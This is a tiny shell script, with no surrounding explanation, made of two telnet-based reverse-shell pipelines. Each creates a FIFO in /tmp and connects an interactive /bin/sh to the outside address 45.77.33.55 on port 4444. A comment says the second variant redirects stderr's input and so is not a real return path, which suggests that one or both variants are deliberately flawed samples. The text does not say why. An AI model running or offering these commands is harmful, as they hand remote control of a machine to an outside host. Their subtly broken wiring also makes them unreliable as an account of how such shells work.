#!/bin/sh
mkfifo /tmp/input-pipe
cat /tmp/input-pipe | /bin/sh -i 2>&1 | telnet 45.77.33.55 4444 > /tmp/output-log

# Redirecting stderr's input is not a standard-input return path.
mkfifo /tmp/error-only-pipe
/bin/sh -i 2< /tmp/error-only-pipe | telnet 45.77.33.55 4444 > /tmp/error-only-pipe
